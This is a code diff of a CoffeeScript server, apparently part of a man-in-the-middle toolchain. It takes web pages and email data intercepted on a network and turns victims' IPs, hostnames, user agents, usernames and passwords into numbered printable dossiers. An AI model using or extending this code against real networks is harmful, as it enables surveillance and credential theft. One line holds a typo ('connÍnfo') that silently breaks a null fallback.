@@ -1,5 +1,5 @@
-subterfuge_image_loc = 'http://192.168.178.113:4000/static/images/'
-subterfuge_css_loc = 'http://192.168.178.113:4000/static/css/'
+subterfuge_image_loc = 'http://localhost:4000/static/scraper/images/'
+subterfuge_css_loc = 'http://localhost:4000/static/scraper/css/'
 
 express = require 'express'
 #fs = require 'fs'
@@ -8,7 +8,11 @@ cheerio = require 'cheerio'
 Handlebars = require 'handlebars'
 Blacklist = require './blacklist'
 fs = require 'fs'
-http = require 'http'
+request = require 'request'
+Canvas = require 'canvas'
+fav = require('fav')(Canvas)
+httpGet = require('http-get')
+
 
 app = express()
 server = require('http').createServer app
@@ -31,8 +35,10 @@ app.configure ->
 # Handlebars and template setup
 Templates = {}
 hbTemplates = 
-	'cover': 'webpage_cover.html'
-	'credentials': 'webpage_credentials.html'
+	'webpage_cover': 'webpage_cover.html'
+	'webpage_credentials': 'webpage_credentials.html'
+	'email_cover': 'email_cover.html'
+	'email_credentials': 'email_credentials.html'
 
 precompileTemplates = ->
 	for name, path of hbTemplates
@@ -61,7 +67,7 @@ io.sockets.on 'connection', (socket) ->
 
 	socket.on 'scrape', (data) ->
 		data = JSON.parse data
-		pageTransformer = new PageTransformer data.page, data.host, data.fullUrl, data.encoding
+		pageTransformer = new PageTransformer data.page, data.host, data.fullUrl, data.title, data.encoding
 		pageTransformer.run()
 
 
@@ -91,7 +97,7 @@ class TemplateTransformer
 		@t = {}
 
 		@t.DossierNr = incSequenceNumber()
-		@t.Timestamp = @obj.date
+		@t.Timestamp = (new Date(@obj.date)).toUTCString()
 
 		@process()
 
@@ -104,16 +110,20 @@ class TemplateTransformer
 		'new:printable:' + @obj.date + '_' + @type
 
 	publish: ->
+		console.log "Publishing printable data...s"
 		redisClient2.publish @getPublishKey(), Templates[@getTemplateKey()](@t), redis.print
 
 
 class WebpageTransformer extends TemplateTransformer
 	process: ->
-		@t.DestIp = 'DEST_IP' #@obj.destIp
+		super()
+		@t.DestIp = @obj.DestIP
+		@t.SrcIp = @obj.IP
 
 class EmailTransformer extends WebpageTransformer
 	process: ->
-		@t.SrcIp = 'SRC_IP' #@obj.srcIp
+		super()
+		
 
 
 # ! --- Webpage Cover -----------------
@@ -127,20 +137,25 @@ class WebpageCoverTransformer extends WebpageTransformer
 		windows: 'data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhLS0gR2VuZXJhdG9yOiBBZG9iZSBJbGx1c3RyYXRvciAxNi4yLjEsIFNWRyBFeHBvcnQgUGx1Zy1JbiAuIFNWRyBWZXJzaW9uOiA2LjAwIEJ1aWxkIDApICAtLT4NCjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+DQo8c3ZnIHZlcnNpb249IjEuMSIgaWQ9IkxheWVyXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB3aWR0aD0iNTEycHgiIGhlaWdodD0iNTEycHgiIHZpZXdCb3g9IjAgMCA1MTIgNTEyIiBzdHlsZT0iZW5hYmxlLWJhY2tncm91bmQ6bmV3IDAgMCA1MTIgNTEyOyIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+DQo8Zz4NCgk8cGF0aCBkPSJNMTk5LjksMjgyLjd2MTA1LjVsLTAuOC0wLjFMOTUuOCwzNjcuM3YtODQuNkgxOTkuOSBNMjAyLjEsMjY2LjdIOTMuNGMtNy40LDAtMTMuNCw2LjEtMTMuNCwxMy43djg5DQoJCWMwLDYuNiw0LjYsMTEuOSwxMC43LDEzLjJsMTA1LjQsMjEuMWw2LjksMS4yYzctMC4zLDEyLjctNi40LDEyLjctMTMuNVYyODAuNEMyMTUuNywyNzIuNywyMDkuNSwyNjYuNywyMDIuMSwyNjYuN0wyMDIuMSwyNjYuN3oiDQoJCS8+DQoJPHBhdGggZD0iTTQxNi4yLDI4Mi43djE0Ny4ybC0yLjEsMS4xbC0xNjAuNC0zMmwtMS0wLjJ2LTExNkg0MTYuMiBNNDE4LjQsMjY2LjdIMjUwLjJjLTcuNCwwLTEzLjQsNi4xLTEzLjQsMTMuN3YxMjAuNXYwLjINCgkJYzAsNS41LDMuMywxMC4xLDcuOSwxMi4yYzAuMiwwLjIsMC4yLDAuMiwwLjIsMC4ybDUuMywxLjFjMC4yLDAsMC4yLDAsMC4zLDBsMTY0LjcsMzIuOWMwLjIsMC4xLDAuNSwwLjMsMC43LDAuMw0KCQljMC4xLDAsMC4yLDAsMC4zLTAuMWMwLjcsMC40LDEuNCwwLjQsMi4xLDAuNGM3LjQsMCwxMy42LTYsMTMuNi0xMy41VjI4MC40QzQzMiwyNzIuNyw0MjUuOCwyNjYuNyw0MTguNCwyNjYuN0w0MTguNCwyNjYuN3oiLz4NCgk8cGF0aCBkPSJNNDE0LDgxLjFsMi4xLDEuMXYxNDcuMkgyNTIuNnYtMTE2bDEtMC4yTDQxNCw4MS4xIE00MTguNCw2NGMtMC43LDAtMS40LDAtMi4xLDAuNGMtMC4xLTAuMS0wLjItMC4xLTAuMy0wLjENCgkJYy0wLjIsMC0wLjUsMC4xLTAuNywwLjNMMjUwLjUsOTcuNGMtMC4yLDAtMC4yLDAtMC4zLDBsLTUuMSwxLjFjMCwwLTAuMiwwLTAuNCwwLjJjLTQuNiwyLjEtNy45LDYuOS03LjksMTIuNHYxMjAuNQ0KCQljMCw3LjYsNiwxMy43LDEzLjQsMTMuN2gxNjguMmM3LjQsMCwxMy42LTYuMSwxMy42LTEzLjdWNzcuNUM0MzIsNzAuMSw0MjUuOCw2NCw0MTguNCw2NEw0MTguNCw2NHoiLz4NCgk8cGF0aCBkPSJNMTk5LjksMTIzLjl2MTA1LjVIOTUuOHYtODQuNkwxOTkuMSwxMjRMMTk5LjksMTIzLjkgTTIwMywxMDdsLTYuOSwxLjJMOTAuNywxMjkuNEM4NC42LDEzMC43LDgwLDEzNiw4MCwxNDIuNnY4OQ0KCQljMCw3LjYsNiwxMy43LDEzLjQsMTMuN2gxMDguOGM3LjQsMCwxMy42LTYuMSwxMy42LTEzLjdWMTIwLjVDMjE1LjcsMTEzLjQsMjEwLjEsMTA3LjQsMjAzLDEwN0wyMDMsMTA3eiIvPg0KPC9nPg0KPC9zdmc+DQo='
 
 	process: ->
+		super()
+		console.log @obj
+		console.log @t
 		@t.FaviconSrc = @obj.faviconSrc
 		@t.OsImage = @getOsImage()
 
 		@t.Title = @obj.title
 		@t.Link = @obj.fullUrl
 
-		@t.HostName = 'HOSTNAME'
-		@t.UAgent = @obj.uagent
+		@t.HostName = if @obj.Hostname then @obj.Hostname.replace('.fritz.box', '') else ''
+		@t.UAgent = @obj.UAgent
 
 	getOsImage: ->
 		os = ''
-		os = 'android'  if @obj.uagent.indexOf 'Android' isnt -1
-		os = 'apple'  if @obj.uagent.indexOf 'Mac' isnt -1
-		os = 'windows' if @obj.uagent.indexOf 'Win' isnt -1
+		uagent = @obj.UAgent
+		if uagent
+			os = 'android'  if uagent.indexOf('Android') isnt -1
+			os = 'apple'  if uagent.indexOf('Mac') isnt -1
+			os = 'windows' if uagent.indexOf('Win') isnt -1
 
 		if @images[os] then @images[os] else ''
 
@@ -151,6 +166,7 @@ class WebpageCredentialsTransformer extends WebpageTransformer
 	type: 'webpage_credentials'
 
 	process: ->
+		super()
 		@t.HostName = 'HOSTNAME'
 		@t.Value = @obj.username
 		@t.Password = @obj.password
@@ -162,6 +178,7 @@ class EmailCoverTransformer extends EmailTransformer
 	type: 'email_cover'
 
 	process: ->
+		super()
 		@t.Subject = @obj.Title
 		@t.DestEmail = 'DEST_EMAIL'
 		@t.HostName = 'HOSTNAME'
@@ -174,6 +191,7 @@ class EmailCredentialsTransformer extends EmailTransformer
 	type: 'email_credentials'
 
 	process: ->
+		super()
 		@t.HostName = 'HOSTNAME'
 		@t.Value = @obj.username
 		@t.Password = @obj.password
@@ -184,12 +202,13 @@ class EmailCredentialsTransformer extends EmailTransformer
 # ! --- PageTansformer --------------------------------------------------------
 
 class PageTransformer
-	constructor: (data, @host, @fullUrl, @encoding) ->
+	constructor: (data, @host, @fullUrl, @title, @encoding) ->
 		@html = '<!DOCTYPE html><html>' + data + '</html>'
 		@$ = cheerio.load @html
 		@timestamp = new Date().getTime()
 
 	run: ->
+		console.log Blacklist.do(@)
 		unless Blacklist.do @
 			@getConnectionInfos()
 			@removeScripts()
@@ -227,22 +246,29 @@ class PageTransformer
 
 	getFaviconSrc: (cb) ->
 		possibleExtensions = ['ico', 'png', 'gif', 'jpg', 'jpeg']
+		re = new RegExp '/', 'g'
 		i = -1
 		opts = 
 			hostname: @host
 			port: 80
-			path: '/favicon.'
-			method: 'HEAD'
+			method: 'GET'
 		checkAndContinue = =>
 			i++
+
 			if i <= possibleExtensions.length
-				opts.path += possibleExtensions[i]
-				req = http.request opts, (res) =>
-					if res.statusCode < 400 and res.statusCode >= 200
-						cb opts.hostname + opts.path
-					else
+				opts.path = '/favicon.' + possibleExtensions[i]
+				uri = 'http://' + opts.hostname + opts.path
+				uri_safe = uri.replace(re, '_')
+				full_path = __dirname + '/favicons/' + uri_safe
+				httpGet.get {url:uri}, full_path, (err, result) ->
+					if (err)
 						checkAndContinue()
-				req.end()
+					else
+						icon = fav(full_path).getLargest()
+						icon.createPNGStream().pipe(fs.createWriteStream(full_path + '.png'))
+						fs.unlink(full_path)
+						cb('file://' + full_path + '.png')
+
 			else
 				cb null
 		checkAndContinue()
@@ -253,12 +279,14 @@ class PageTransformer
 		jsonTag = $('#mitm-scraper-conn-info')
 		if jsonTag.length
 			connInfo = JSON.parse jsonTag.html()
-			if connInfo
-				#connInfo.sequenceNumber = incSequenceNumber()
-				# get the favicon and callback when necessary
-				@getFaviconSrc (src) ->
-					connInfo.faviconSrc = src
-					new WebpageCoverTransformer(connInfo).publish()
+			connÍnfo = connInfo or {}
+			connInfo.fullUrl = @fullUrl
+			connInfo.title = @title
+			# get the favicon and callback when necessary
+			connInfo.date = @timestamp
+			@getFaviconSrc (src) ->
+				connInfo.faviconSrc = src
+				new WebpageCoverTransformer(connInfo).publish()
 					#@coverHtml = Templates.cover connInfo
 					#redisClient2.publish 'new:printable:' + @timestamp + '_cover', @coverHtml, redis.print
 			
